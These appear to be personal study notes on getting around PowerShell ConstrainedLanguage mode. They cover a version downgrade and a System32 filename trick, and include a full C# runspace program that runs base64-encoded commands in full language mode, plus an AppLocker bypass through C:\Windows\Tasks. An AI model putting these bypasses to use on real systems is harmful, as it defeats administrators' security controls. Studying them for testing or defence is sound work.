\section{PowerShell ConstrainedLanguage Mode}

enabling Constained mode:
\begin{verbatim}
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

# Environmental Variable, all new sessions will start in Constrained Mode
# quotes are to be that way
[Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)
# restore
[Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘1’, ‘Machine‘)
\end{verbatim}


\subsection{Downgrading}

\begin{verbatim}
powershell -version Powershell 2
\end{verbatim}
The main issue with this, is that PowerShell 2.0 has been deprecated since 2017, and so it is becoming less common to find machines with it still enabled

\subsection{System32 Bypass}
 https://www.blackhillsinfosec.com/constrained-language-mode-bypass-when-pslockdownpolicy-is-used/ that there's another way to bypass the contrained language mode and it's super easy - the path from where your script is being executed, needs to contain the string system32, meaning even if you rename the script to system32.ps1

this is due to:
\begin{verbatim}
private static SystemEnforcementMode GetDebugLockdownPolicy(string path)
{
    s_allowDebugOverridePolicy = true;

    // Support fall-back debug hook for path exclusions on non-WOA platforms
    if (path != null)
    {
        // Assume everything under SYSTEM32 is trusted, with a purposefully sloppy
        // check so that we can actually put it in the filename during testing.
        if (path.Contains("System32", StringComparison.OrdinalIgnoreCase))
        {
            return SystemEnforcementMode.None;
        }

        // No explicit debug allowance for the file, so return the system policy if there is one.
        return s_systemLockdownPolicy.GetValueOrDefault(SystemEnforcementMode.None);
    }
\end{verbatim}




\begin{verbatim}
Get-Content .\test.ps1
$mode = $ExecutionContext.SessionState.LanguageMode
write-host $mode

.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
ConstrainedLanguage
FullLanguage
\end{verbatim}

does not work because \verb+running scripts is disabled on this system+

need to:
\begin{verbatim}
 Set-ExecutionPolicy  Unrestricted 
\end{verbatim}


\subsection{Runspace bypass}
bypassing ConstrainedLanguage mode is actually quite simple thanks to \href{https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/creating-runspaces?view=powershell-7.4}{PowerShell Runspaces}.

A PowerShell Runspace is the operating environment for PowerShell commands invoked by a host application, including what language mode it operates under. When launching powershell.exe, Windows creates a runspace in the background which executes all the commands inputted. We may not be able to control this runspace, however we are able to write our own program which uses a runspace that we configure, which means we can just create a runspace which does not operate in ConstrainedLanguage mode.


To demonstrate this, let's develop a small program which takes in a PowerShell command as a command line argument and executes it inside a custom runspace. we do need to add a reference (\verb+Project > Add Reference...+) to the \verb+System.Management.Automation+ namespace for the project need to load dll in filesystem

\begin{verbatim}
C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
\end{verbatim}

links:
\begin{itemize}
    \item
        \href{https://code-maze.com/csharp-run-powershell-script/}{Execute a PowerShell Script in C\#}
    \item 
        \href{https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.powershell.addscript?view=powershellsdk-7.4.0#system-management-automation-powershell-addscript(system-string-system-boolean)}{AddScript}
    \item
        \href{https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.powershell?view=powershellsdk-7.4.0}{Powershell Class}

\end{itemize}

\begin{verbatim}
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;

namespace CLMBypass
{
    internal class Program
    {
        public static bool IsBase64Encoded(String str)
        {
            try
            {
                // If no exception is caught, then it is possibly a base64 encoded string
                byte[] data = Convert.FromBase64String(str);
                // The part that checks if the string was properly padded to the
                // correct length was borrowed from d@anish's solution
                return (str.Replace(" ", "").Length % 4 == 0);
            }
            catch
            {
                // If exception is caught, then it is not a base64 encoded string
                return false;
            }
        }
        static void Main(string[] args)
        {
            String[] p;
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            p = args;
            if (args.Length == 0) return;
            // by default FullLanguage
            if (IsBase64Encoded(args[0]))
            {
                args[0] =Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
            }
            try
            {
                PowerShell ps = PowerShell.Create();
                ps.Runspace = runspace;


                ps.AddScript(String.Join(" ", p));
                Collection<PSObject> results = ps.Invoke();
                foreach (PSObject obj in results)
                {
                    Console.WriteLine(obj.ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Something went wrong {e.Message}");
            }

            runspace.Close();
        }
    }
}
\end{verbatim}


Since AppLocker is configured, it is necessary to bypass that still. In this case, we can simply copy CLMBypass.exe to \verb+C:\Windows\Tasks+.
